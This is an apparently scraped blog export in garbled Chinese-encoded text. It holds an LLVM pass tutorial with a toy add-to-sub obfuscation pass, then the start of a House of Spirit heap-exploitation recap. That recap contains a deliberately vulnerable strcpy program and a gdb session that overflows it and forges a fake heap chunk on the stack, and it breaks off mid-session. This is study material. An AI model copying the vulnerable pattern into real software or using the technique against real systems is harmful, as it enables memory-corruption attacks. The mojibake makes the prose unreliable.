ç”Ÿæˆå™¨çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨ç¨‹åºä¸­çš„æ¯ä¸ªLLVMå‡½æ•°çš„ä¾èµ–äºæœºå™¨çš„è¡¨ç¤ºä¸Šæ‰§è¡Œã€‚ æ ¹æ®LLVM for Grad Studentsæ–‡ç« çš„æ–¹å¼å»åŠ¨æ€ä½¿ç”¨passã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace { struct SkeletonPass : public FunctionPass { static char ID; SkeletonPass() : FunctionPass(ID) {} virtual bool runOnFunction(Function &amp;F) { errs() &lt;&lt; &quot;In a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; //å¦‚æœæ˜¯å‡½æ•°ï¼Œè¾“å‡ºå‡½æ•°åå­— errs() &lt;&lt; &quot;Function body:\\n&quot;; F.dump(); //æ‰“å°å‡½æ•°ä½“ for (auto &amp;B : F) { errs() &lt;&lt; &quot;Basic block:\\n&quot;; //æ˜¯bbå—å°±è¾“å‡ºè¿™è¡Œ B.dump(); for (auto &amp;I : B) { errs() &lt;&lt; &quot;Instruction: &quot;; //æŒ‡ä»¤çš„è¯å°±è¾“å‡ºè¿™è¡Œ I.dump(); } } return false; } };}char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.html // æ³¨å†ŒPassstatic void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SkeletonPass());}static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); CmakeList.txtæ–‡ä»¶ 12345678910111213141516171819202122add_library(SkeletonPass MODULE # List your source files here. Skeleton.cpp)# Use C++11 to compile our pass (i.e., supply -std=c++11).target_compile_features(SkeletonPass PRIVATE cxx_range_for cxx_auto_type)# LLVM is (typically) built with no C++ RTTI. We need to match that;# otherwise, we'll get linker errors about missing RTTI data.set_target_properties(SkeletonPass PROPERTIES COMPILE_FLAGS &quot;-fno-rtti&quot;)# Get proper shared-library behavior (where symbols are not necessarily# resolved when the shared library is linked) on OS X.if(APPLE) set_target_properties(SkeletonPass PROPERTIES LINK_FLAGS &quot;-undefined dynamic_lookup&quot; )endif(APPLE) ç¼–è¯‘pass 1234mkdir buildcd buildcmake ..make ç„¶åå°±å¯ä»¥äº† 123456# muhe @ muhe-work in ~/Code/llvm-pass-skeleton/build on git:master x [17:10:02] $ makeScanning dependencies of target SkeletonPass[ 50%] Building CXX object skeleton/CMakeFiles/SkeletonPass.dir/Skeleton.cpp.o[100%] Linking CXX shared module libSkeletonPass.so[100%] Built target SkeletonPass ç°åœ¨ç¼–å†™ä¸€ä¸ªç¨‹åºæ¥æµ‹è¯•è¿™ä¸ªPassï¼Œæˆ‘ä»¬çš„Passå¯ä»¥æ ‡è¯†å‡ºä»£ç å—å’ŒæŒ‡ä»¤ã€‚ 1234567891011121314151617181920#include&lt;stdio.h&gt;void func(){ printf(&quot;I am a func\\n&quot;);}int main(int argc,char*argv[]){ int i = 0; for(;i&lt;10;i++){ printf(&quot;test time : %d\\n&quot;,i); } func(); printf(&quot;Done\\n&quot;); return 0;} ç°åœ¨è¿è¡Œè¿™ä¸ªPassclang -Xclang -load -Xclang build/skeleton/libSkeletonPass.so -c test.c å¾—åˆ°çš„ç»“æœç•¥é•¿ï¼Œå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119# muhe @ muhe-work in ~/Code/llvm-pass-skeleton on git:master x [17:20:12] $ clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.so -c test.c In a function called func!Function body:; Function Attrs: noinline nounwind uwtabledefine void @func() #0 { %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)) ret void}Basic block: %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)) ret voidInstruction: %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))Instruction: ret voidIn a function called main!Function body:; Function Attrs: noinline nounwind uwtabledefine i32 @main(i32, i8**) #0 { %3 = alloca i32, align 4 %4 = alloca i32, align 4 %5 = alloca i8**, align 8 %6 = alloca i32, align 4 store i32 0, i32* %3, align 4 store i32 %0, i32* %4, align 4 store i8** %1, i8*** %5, align 8 store i32 0, i32* %6, align 4 br label %7; &lt;label&gt;:7: ; preds = %13, %2 %8 = load i32, i32* %6, align 4 %9 = icmp slt i32 %8, 10 br i1 %9, label %10, label %16; &lt;label&gt;:10: ; preds = %7 %11 = load i32, i32* %6, align 4 %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11) br label %13; &lt;label&gt;:13: ; preds = %10 %14 = load i32, i32* %6, align 4 %15 = add nsw i32 %14, 1 store i32 %15, i32* %6, align 4 br label %7; &lt;label&gt;:16: ; preds = %7 call void @func() %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0)) ret i32 0}Basic block: %3 = alloca i32, align 4 %4 = alloca i32, align 4 %5 = alloca i8**, align 8 %6 = alloca i32, align 4 store i32 0, i32* %3, align 4 store i32 %0, i32* %4, align 4 store i8** %1, i8*** %5, align 8 store i32 0, i32* %6, align 4 br label %7Instruction: %3 = alloca i32, align 4Instruction: %4 = alloca i32, align 4Instruction: %5 = alloca i8**, align 8Instruction: %6 = alloca i32, align 4Instruction: store i32 0, i32* %3, align 4Instruction: store i32 %0, i32* %4, align 4Instruction: store i8** %1, i8*** %5, align 8Instruction: store i32 0, i32* %6, align 4Instruction: br label %7Basic block:; &lt;label&gt;:7: ; preds = %13, %2 %8 = load i32, i32* %6, align 4 %9 = icmp slt i32 %8, 10 br i1 %9, label %10, label %16Instruction: %8 = load i32, i32* %6, align 4Instruction: %9 = icmp slt i32 %8, 10Instruction: br i1 %9, label %10, label %16Basic block:; &lt;label&gt;:10: ; preds = %7 %11 = load i32, i32* %6, align 4 %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11) br label %13Instruction: %11 = load i32, i32* %6, align 4Instruction: %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11)Instruction: br label %13Basic block:; &lt;label&gt;:13: ; preds = %10 %14 = load i32, i32* %6, align 4 %15 = add nsw i32 %14, 1 store i32 %15, i32* %6, align 4 br label %7Instruction: %14 = load i32, i32* %6, align 4Instruction: %15 = add nsw i32 %14, 1Instruction: store i32 %15, i32* %6, align 4Instruction: br label %7Basic block:; &lt;label&gt;:16: ; preds = %7 call void @func() %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0)) ret i32 0Instruction: call void @func()Instruction: %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0))Instruction: ret i32 0 ä¸€äº›åŒ…å«å…³ç³»ï¼š[Module [Function [BasicBlock [Instruction]]]] ä»–è¿™ç¯‡æ–‡ç« åé¢ä¾‹å­è¿˜æœ‰ä½¿ç”¨Passæ›¿æ¢ä¸€äº›æŒ‡ä»¤ï¼Œå¦‚æŠŠaddæ¢æˆäº†mulï¼Œæ„Ÿå…´è¶£å¯ä»¥è·Ÿç€ä»–çš„æ–‡ç« å†™ä¸€ä¸‹ã€‚ 0x3. ä½¿ç”¨LLVMæ¥åšæ··æ·†addæ›¿æ¢æˆsubæŒ‡ä»¤ï¼Œå³add a,bæ¢æˆäº†sub a,-b 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Pass.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/Intrinsics.h&quot;#include &quot;llvm/IR/Instructions.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace { struct SimplePass : public FunctionPass { static char ID; // Pass identification, replacement for typeid SimplePass() : FunctionPass(ID) {} bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // éå†å‡½æ•°ä¸­çš„æ‰€æœ‰åŸºæœ¬å— for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // éå†åŸºæœ¬å—ä¸­çš„æ¯æ¡æŒ‡ä»¤ for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // æ˜¯å¦æ˜¯addæŒ‡ä»¤ if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { return ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } // a+b === a-(-b) bool ob_add(BinaryOperator *bo) { BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) { // ç”Ÿæˆ (ï¼b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); // ç”Ÿæˆ a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); // æ›¿æ¢æ‰€æœ‰å‡ºç°è¯¥æŒ‡ä»¤çš„åœ°æ–¹ bo-&gt;replaceAllUsesWith(op); return true; } } };}char SimplePass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSimplePass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SimplePass());}static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSimplePass); 1234567891011121314151617181920add_library(SimplePass MODULE # List your source files here. SimplePass.cpp)# Use C++11 to compile our pass (i.e., supply -std=c++11).target_compile_features(SimplePass PRIVATE cxx_range_for cxx_auto_type)# LLVM is (typically) built with no C++ RTTI. We need to match that.set_target_properties(SimplePass PROPERTIES COMPILE_FLAGS &quot;-fno-rtti&quot;)# Get proper shared-library behavior (where symbols are not necessarily# resolved when the shared library is linked) on OS X.if(APPLE) set_target_properties(SimplePass PROPERTIES LINK_FLAGS &quot;-undefined dynamic_lookup&quot; )endif(APPLE) æˆ‘çš„æµ‹è¯•ä»£ç å¦‚ä¸‹ 123456789$ cat example.c #include &lt;stdio.h&gt;int main(int argc, const char** argv) { int num; scanf(&quot;%i&quot;, &amp;num); printf(&quot;%i\\n&quot;, num + 2); return 0;} å…ˆç¼–è¯‘æ­£å¸¸çš„ç¨‹åºclang example.c -o before 12$ file before before: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped çœ‹ä¸€ä¸‹mainçš„é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233343536objdump -M intel -d before . . . 0000000000400580 &lt;main&gt;: 400580: 55 push rbp 400581: 48 89 e5 mov rbp,rsp 400584: 48 83 ec 20 sub rsp,0x20 400588: 48 b8 64 06 40 00 00 movabs rax,0x400664 40058f: 00 00 00 400592: 48 8d 4d ec lea rcx,[rbp-0x14] 400596: c7 45 fc 00 00 00 00 mov DWORD PTR [rbp-0x4],0x0 40059d: 89 7d f8 mov DWORD PTR [rbp-0x8],edi 4005a0: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 4005a4: 48 89 c7 mov rdi,rax 4005a7: 48 89 ce mov rsi,rcx 4005aa: b0 00 mov al,0x0 4005ac: e8 af fe ff ff call 400460 &lt;__isoc99_scanf@plt&gt; 4005b1: 48 bf 67 06 40 00 00 movabs rdi,0x400667 4005b8: 00 00 00 4005bb: 8b 55 ec mov edx,DWORD PTR [rbp-0x14] 4005be: 83 c2 02 add edx,0x2 //num + 2 è¯­å¥ 4005c1: 89 d6 mov esi,edx 4005c3: 89 45 e8 mov DWORD PTR [rbp-0x18],eax 4005c6: b0 00 mov al,0x0 4005c8: e8 73 fe ff ff call 400440 &lt;printf@plt&gt; 4005cd: 31 d2 xor edx,edx 4005cf: 89 45 e4 mov DWORD PTR [rbp-0x1c],eax 4005d2: 89 d0 mov eax,edx 4005d4: 48 83 c4 20 add rsp,0x20 4005d8: 5d pop rbp 4005d9: c3 ret 4005da: 66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0]. . . ç°åœ¨ç¼–è¯‘ä¸€ä¸ªæ··æ·†è¿‡çš„ 1234mkdir build_1cd build_1cmake ..make ç„¶åclang -Xclang -load -Xclang build_1/simple/libSimplePass.so -c example.cå¾—åˆ°example.oæ–‡ä»¶ï¼Œè¿™ä¸ªè¿˜æ²¡é“¾æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨clangå†é“¾æ¥ä¸€ä¸‹å°±å¥½äº†ã€‚ 1234$ clang example.o -o example $ file exampleexample: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped åæ±‡ç¼–çœ‹ä¸€ä¸‹mainçš„é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233340000000000400580 &lt;main&gt;: 400580: 55 push rbp 400581: 48 89 e5 mov rbp,rsp 400584: 48 83 ec 20 sub rsp,0x20 400588: 48 b8 74 06 40 00 00 movabs rax,0x400674 40058f: 00 00 00 400592: 48 8d 4d ec lea rcx,[rbp-0x14] 400596: c7 45 fc 00 00 00 00 mov DWORD PTR [rbp-0x4],0x0 40059d: 89 7d f8 mov DWORD PTR [rbp-0x8],edi 4005a0: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 4005a4: 48 89 c7 mov rdi,rax 4005a7: 48 89 ce mov rsi,rcx 4005aa: b0 00 mov al,0x0 4005ac: e8 af fe ff ff call 400460 &lt;__isoc99_scanf@plt&gt; 4005b1: 48 bf 77 06 40 00 00 movabs rdi,0x400677 4005b8: 00 00 00 4005bb: 31 d2 xor edx,edx 4005bd: 44 8b 45 ec mov r8d,DWORD PTR [rbp-0x14] 4005c1: 83 ea 02 sub edx,0x2 4005c4: 41 29 d0 sub r8d,edx //å·²ç»è¢«æ›¿æ¢äº† 4005c7: 44 89 c6 mov esi,r8d 4005ca: 89 45 e8 mov DWORD PTR [rbp-0x18],eax 4005cd: b0 00 mov al,0x0 4005cf: e8 6c fe ff ff call 400440 &lt;printf@plt&gt; 4005d4: 31 d2 xor edx,edx 4005d6: 89 45 e4 mov DWORD PTR [rbp-0x1c],eax 4005d9: 89 d0 mov eax,edx 4005db: 48 83 c4 20 add rsp,0x20 4005df: 5d pop rbp 4005e0: c3 ret 4005e1: 66 2e 0f 1f 84 00 00 nop WORD PTR cs:[rax+rax*1+0x0] 4005e8: 00 00 00 4005eb: 0f 1f 44 00 00 nop DWORD PTR [rax+rax*1+0x0] è¿™ä¸ªåªæ˜¯demoè€Œå·²ï¼Œå‡ ä¹æ²¡ä»€ä¹ˆå¼ºåº¦ã€‚ 0x4. å‚è€ƒå’Œå¼•ç”¨llvmåŸºäºLLVMçš„ä»£ç æ··æ·†LLVM for Grad Students","link":"/2017/02/27/LLVM-Study-Log/"},{"title":"Malloc-Maleficarum-å¤ç›˜","text":"1.HOSä¼ªé€ å †å—ï¼Œæœ€ç»ˆmalloc()åˆ†é…åˆ°æ ˆä¸Šçš„ç©ºé—´ã€‚ è¿™ä»½æºç æ¥è‡ªè¿™é‡Œä½†æ˜¯æˆ‘è¿™è¾¹å¤ç°ä»–è¿™ä¸ªæœ‰ç‚¹é—®é¢˜ï¼ŒåŸå› åº”è¯¥æ˜¯gccç‰ˆæœ¬çš„é—®é¢˜ï¼Œåªæ˜¯ä¸ºäº†ææ˜ç™½åŸç†ï¼Œç›´æ¥gdbé‡Œæš´åŠ›set valueå°±å¯ä»¥äº†ã€‚è¿™é‡Œé™„ä¸Šgdbçš„è°ƒè¯•è¿‡ç¨‹ã€‚ 12345678910111213141516171819202122232425262728293031# muhe @ ubuntu in ~/Desktop/study [2:54:31] $ lshos hos.c# muhe @ ubuntu in ~/Desktop/study [2:54:33] $ cat hos.c #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void fvuln(char *str1, int age){ char *ptr1; int local_age; char name[32]; char *ptr2; local_age = age; ptr1 = (char *) malloc(256); printf(&quot;\\nPTR1 = [ %p ]&quot;, ptr1); strcpy(name, str1); printf(&quot;\\nPTR1 = [ %p ]\\n&quot;, ptr1); free(ptr1); ptr2 = (char *) malloc(40); snprintf(ptr2, 40-1, &quot;%s is %d years old&quot;, name, local_age); printf(&quot;\\n%s\\n&quot;, ptr2);}int main(int argc, char *argv[]){ int pad[10] = {0, 0, 0, 0, 0, 0, 0, 10, 0, 0}; if (argc == 3) fvuln(argv[1], atoi(argv[2])); return 0;} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# muhe @ ubuntu in ~/Desktop/study [2:54:35] $ gcc hos.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -z execstack -o hos -g# muhe @ ubuntu in ~/Desktop/study [2:54:45] $ gdb ./hos -qReading symbols from ./hos...done.gdb-peda$ pdisass fvulnDump of assembler code for function fvuln: 0x080484fb &lt;+0&gt;: push ebp 0x080484fc &lt;+1&gt;: mov ebp,esp 0x080484fe &lt;+3&gt;: sub esp,0x2c 0x08048501 &lt;+6&gt;: mov eax,DWORD PTR [ebp+0xc] 0x08048504 &lt;+9&gt;: mov DWORD PTR [ebp-0x4],eax 0x08048507 &lt;+12&gt;: push 0x100 0x0804850c &lt;+17&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x08048511 &lt;+22&gt;: add esp,0x4 0x08048514 &lt;+25&gt;: mov DWORD PTR [ebp-0x8],eax 0x08048517 &lt;+28&gt;: push DWORD PTR [ebp-0x8] 0x0804851a &lt;+31&gt;: push 0x8048660 0x0804851f &lt;+36&gt;: call 0x8048380 &lt;printf@plt&gt; 0x08048524 &lt;+41&gt;: add esp,0x8 0x08048527 &lt;+44&gt;: push DWORD PTR [ebp+0x8] 0x0804852a &lt;+47&gt;: lea eax,[ebp-0x2c] 0x0804852d &lt;+50&gt;: push eax 0x0804852e &lt;+51&gt;: call 0x80483a0 &lt;strcpy@plt&gt; 0x08048533 &lt;+56&gt;: add esp,0x8 0x08048536 &lt;+59&gt;: push DWORD PTR [ebp-0x8] 0x08048539 &lt;+62&gt;: push 0x804866f 0x0804853e &lt;+67&gt;: call 0x8048380 &lt;printf@plt&gt; 0x08048543 &lt;+72&gt;: add esp,0x8 0x08048546 &lt;+75&gt;: push DWORD PTR [ebp-0x8] 0x08048549 &lt;+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x0804854e &lt;+83&gt;: add esp,0x4 0x08048551 &lt;+86&gt;: push 0x28 0x08048553 &lt;+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x08048558 &lt;+93&gt;: add esp,0x4 0x0804855b &lt;+96&gt;: mov DWORD PTR [ebp-0xc],eax 0x0804855e &lt;+99&gt;: push DWORD PTR [ebp-0x4] 0x08048561 &lt;+102&gt;: lea eax,[ebp-0x2c] 0x08048564 &lt;+105&gt;: push eax 0x08048565 &lt;+106&gt;: push 0x804867f 0x0804856a &lt;+111&gt;: push 0x27 0x0804856c &lt;+113&gt;: push DWORD PTR [ebp-0xc] 0x0804856f &lt;+116&gt;: call 0x80483d0 &lt;snprintf@plt&gt; 0x08048574 &lt;+121&gt;: add esp,0x14 0x08048577 &lt;+124&gt;: push DWORD PTR [ebp-0xc] 0x0804857a &lt;+127&gt;: push 0x8048692 0x0804857f &lt;+132&gt;: call 0x8048380 &lt;printf@plt&gt; 0x08048584 &lt;+137&gt;: add esp,0x8 0x08048587 &lt;+140&gt;: nop 0x08048588 &lt;+141&gt;: leave 0x08048589 &lt;+142&gt;: ret End of assembler dump.gdb-peda$ b *0x0804850cBreakpoint 1 at 0x804850c: file hos.c, line 14.gdb-peda$ b *0x0804852eBreakpoint 2 at 0x804852e: file hos.c, line 16.gdb-peda$ b *0x08048549Breakpoint 3 at 0x8048549: file hos.c, line 19.gdb-peda$ b *0x08048553Breakpoint 4 at 0x8048553: file hos.c, line 21.gdb-peda$ r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc 20Starting program: /home/muhe/Desktop/study/hos aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc 20 1234567891011121314151617181920212223242526272829303132333435363738 [----------------------------------registers-----------------------------------]EAX: 0x14 EBX: 0x0 ECX: 0x0 EDX: 0x14 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c --&gt; 0x100 EIP: 0x804850c (&lt;fvuln+17&gt;: call 0x80483b0 &lt;malloc@plt&gt;)EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048501 &lt;fvuln+6&gt;: mov eax,DWORD PTR [ebp+0xc] 0x8048504 &lt;fvuln+9&gt;: mov DWORD PTR [ebp-0x4],eax 0x8048507 &lt;fvuln+12&gt;: push 0x100=&gt; 0x804850c &lt;fvuln+17&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048511 &lt;fvuln+22&gt;: add esp,0x4 0x8048514 &lt;fvuln+25&gt;: mov DWORD PTR [ebp-0x8],eax 0x8048517 &lt;fvuln+28&gt;: push DWORD PTR [ebp-0x8] 0x804851a &lt;fvuln+31&gt;: push 0x8048660Guessed arguments:arg[0]: 0x100 arg[1]: 0x0 [------------------------------------stack-------------------------------------]0000| 0xffffd51c --&gt; 0x100 0004| 0xffffd520 --&gt; 0x0 0008| 0xffffd524 --&gt; 0xffffd5c4 --&gt; 0x61b64d7e 0012| 0xffffd528 --&gt; 0xf7fe76db (add esi,0x15925)0016| 0xffffd52c --&gt; 0x0 0020| 0xffffd530 --&gt; 0xf7e39c45 (&lt;strtol+5&gt;: add eax,0x17f3bb)0024| 0xffffd534 --&gt; 0xf7e37040 (&lt;atoi+16&gt;: add esp,0x1c)0028| 0xffffd538 --&gt; 0xffffd851 --&gt; 0x58003032 ('20')[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0x0804850c in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x14) at hos.c:1414 ptr1 = (char *) malloc(256);gdb-peda$ cContinuing. 12345678910111213141516171819202122232425262728293031323334353637383940[----------------------------------registers-----------------------------------]EAX: 0xffffd520 --&gt; 0x0 EBX: 0x0 ECX: 0x7fffffec EDX: 0xf7fba870 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd518 --&gt; 0xffffd520 --&gt; 0x0 EIP: 0x804852e (&lt;fvuln+51&gt;: call 0x80483a0 &lt;strcpy@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x8048527 &lt;fvuln+44&gt;: push DWORD PTR [ebp+0x8] 0x804852a &lt;fvuln+47&gt;: lea eax,[ebp-0x2c] 0x804852d &lt;fvuln+50&gt;: push eax=&gt; 0x804852e &lt;fvuln+51&gt;: call 0x80483a0 &lt;strcpy@plt&gt; 0x8048533 &lt;fvuln+56&gt;: add esp,0x8 0x8048536 &lt;fvuln+59&gt;: push DWORD PTR [ebp-0x8] 0x8048539 &lt;fvuln+62&gt;: push 0x804866f 0x804853e &lt;fvuln+67&gt;: call 0x8048380 &lt;printf@plt&gt;Guessed arguments:arg[0]: 0xffffd520 --&gt; 0x0 arg[1]: 0xffffd828 ('a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)[------------------------------------stack-------------------------------------]0000| 0xffffd518 --&gt; 0xffffd520 --&gt; 0x0 0004| 0xffffd51c --&gt; 0xffffd828 ('a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)0008| 0xffffd520 --&gt; 0x0 0012| 0xffffd524 --&gt; 0xffffd5c4 --&gt; 0x61b64d7e 0016| 0xffffd528 --&gt; 0xf7fe76db (add esi,0x15925)0020| 0xffffd52c --&gt; 0x0 0024| 0xffffd530 --&gt; 0xf7e39c45 (&lt;strtol+5&gt;: add eax,0x17f3bb)0028| 0xffffd534 --&gt; 0xf7e37040 (&lt;atoi+16&gt;: add esp,0x1c)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 2, 0x0804852e in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x14) at hos.c:1616 strcpy(name, str1);gdb-peda$ cContinuing.PTR1 = [ 0x804b008 ]PTR1 = [ 0x63636363 ] è¿™é‡Œä¼ªé€ å †å—ï¼Œä½†æ˜¯ä¸ºäº†è¿‡malloc()å¯¹fastbinçš„checkï¼Œæ‰€ä»¥éœ€è¦å†è®¾ç½®ä¸‹ä¸‹ä¸€ä¸ªå—ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 [----------------------------------registers-----------------------------------]EAX: 0x17 EBX: 0x0 ECX: 0x7fffffeb EDX: 0xf7fba870 --&gt; 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c (&quot;cccc&quot;, 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)EIP: 0x8048549 (&lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt;)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x804853e &lt;fvuln+67&gt;: call 0x8048380 &lt;printf@plt&gt; 0x8048543 &lt;fvuln+72&gt;: add esp,0x8 0x8048546 &lt;fvuln+75&gt;: push DWORD PTR [ebp-0x8]=&gt; 0x8048549 &lt;fvuln+78&gt;: call 0x8048390 &lt;free@plt&gt; 0x804854e &lt;fvuln+83&gt;: add esp,0x4 0x8048551 &lt;fvuln+86&gt;: push 0x28 0x8048553 &lt;fvuln+88&gt;: call 0x80483b0 &lt;malloc@plt&gt; 0x8048558 &lt;fvuln+93&gt;: add esp,0x4Guessed arguments:arg[0]: 0x63636363 ('cccc')[------------------------------------stack-------------------------------------]0000| 0xffffd51c (&quot;cccc&quot;, 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)0004| 0xffffd520 ('a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;)0008| 0xffffd524 ('a' &lt;repeats 28 times&gt;, &quot;bbbbcccc&quot;)0012| 0xffffd528 ('a' &lt;repeats 24 times&gt;, &quot;bbbbcccc&quot;)0016| 0xffffd52c ('a' &lt;repeats 20 times&gt;, &quot;bbbbcccc&quot;)0020| 0xffffd530 ('a' &lt;repeats 16 times&gt;, &quot;bbbbcccc&quot;)0024| 0xffffd534 ('a' &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 3, 0x08048549 in fvuln (str1=0xffffd828 'a' &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age=0x14) at hos.c:1919 free(ptr1);gdb-peda$ x/10wx $esp0xffffd51c: 0x63636363 0x61616161 0x61616161 0x616161610xffffd52c: 0x61616161 0x61616161 0x61616161 0x616161610xffffd53c: 0x61616161 0x62626262gdb-peda$ set *(int*)0xffffd51c = 0xffffd530gdb-peda$ x/10wx 0xffffd530 - 80xffffd528: 0x61616161 0x61616161 0x61616161 0x616161610xffffd538: 0x61616161 0x61616161 0x62626262 0x636363630xffffd548: 0x00000000 0xffffd588gdb-peda$ set *(int*)0xffffd528=0x0gdb-peda$ set *(int*)0xffffd52c=0x31gdb-peda$ x/10wx 0xffffd530 - 8 + 0x300xffffd558: 0x00000014 0x00000000 0x00000000 0x000000000xffffd568: 0x00000000 0x00000000 0x00000000 0x000000000xffffd578: 0x0000000a 0x00000000gdb-peda$ set *(int*)0xffffd558 = 0x31gdb-peda$ set *(int*)0xffffd55c = 0x30gdb-peda$ ni 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 [----------------------------------registers-----------------------------------]EAX: 0x0 EBX: 0x0 ECX: 0xf7fb9000 --&gt; 0x1aedb0 EDX: 0x0 ESI: 0xf7fb9000 --&gt; 0x1aedb0 EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 ESP: 0xffffd51c 